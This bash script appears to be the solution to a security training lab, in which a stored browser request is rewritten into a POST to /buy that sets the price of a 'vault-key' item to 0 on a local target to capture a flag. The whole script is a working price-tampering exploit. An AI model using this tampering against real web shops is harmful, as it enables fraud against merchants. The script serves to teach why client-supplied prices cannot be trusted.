#!/usr/bin/env bash
# Lab 02 — the price is a request field, so it is an attacker field.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9020}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab02

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# `--create` because the stored request is the GET of the homepage: it has no
# body, no method POST and no form fields until this command adds them.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/buy \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.item=vault-key --set form.price=0 --set form.qty=1 | flag
